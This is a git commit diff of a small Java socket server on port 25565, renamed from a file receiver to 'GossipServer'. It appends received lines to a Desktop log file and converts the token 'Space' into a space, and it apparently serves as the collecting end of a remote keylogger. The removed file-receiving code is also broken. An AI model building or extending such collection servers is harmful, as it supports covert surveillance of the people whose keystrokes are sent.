bc391d6763282cc529a8ac5cbc928560bc20a7d9
Yui Hirasawa <duvictor514@gmail.com>
2017-06-01 14:22:11 -0700

    Update ashiatonikki.java

--- ashiatonikki.java
+++ ashiatonikki.java
@@ -1,10 +1,12 @@
+package artemidoriusrecv;
 
 import java.io.*;
 import java.net.*;
-public class ashiatonikki
+public class GossipServer
 {
   public static void main(String[] args) throws Exception
   {
+	  for(;;){
       @SuppressWarnings("resource")
       ServerSocket sersock = new ServerSocket(25565);
       System.out.println("Ready to receive files");
@@ -13,30 +15,34 @@ public class ashiatonikki
       BufferedReader receiveRead = new BufferedReader(new InputStreamReader(istream));
       String receiveMessage;  
       for(;;)
-      {
-        if((receiveMessage = receiveRead.readLine()) != null)  
-        {
-           System.out.println(receiveMessage); 
-          int filesize=Integer.MAX_VALUE - 10; 
-     	  int bytesRead; 
-     	  int currentTot = 0; 
-     	  byte [] bytearray = new byte [filesize]; 
-     	 InputStream is = sock.getInputStream(); 
- 		FileOutputStream fos = new FileOutputStream("C:/Users/" + System.getProperty("user.name") + "/Documents/" + receiveMessage); 
- 		BufferedOutputStream bos = new BufferedOutputStream(fos); 
- 		bytesRead = is.read(bytearray,0,bytearray.length); 
- 		currentTot = bytesRead; 
- 		do { 
- 			bytesRead = is.read(bytearray, currentTot, (bytearray.length-currentTot)); 
- 			if(bytesRead >= 0) {
- 				currentTot += bytesRead; 
- 			}
- 			} 
- 			while(bytesRead > -1);
- 			bos.write(bytearray, 0 , currentTot); 
- 			bos.flush(); 
- 			System.out.println("File received and saved from " + receiveMessage + ".");
- 			} 
-        }         
-      }               
-}                    
+      { 
+    	  if((receiveMessage = receiveRead.readLine()) != null)  
+          {
+        	 System.out.println(receiveMessage); 
+        	 record(receiveMessage);
+          }
+      } 
+	  }
+  }
+  public static void record(String x) {
+		try {
+			File log = new File("C:/Users/" + System.getProperty("user.name") + "/Desktop/log.txt");
+			if(!log.exists()) {
+				log.createNewFile();
+			}
+			String filename = "C:/Users/" + System.getProperty("user.name") + "/Desktop/log.txt";
+			PrintWriter out = new PrintWriter(new FileWriter(filename, true));
+			// System.out.println("rec " + x);
+			if(x.matches("Space")) {
+				out.print(" ");
+				out.close();
+			} else {
+			out.print(x);
+			out.close();
+			}
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+	}
+}
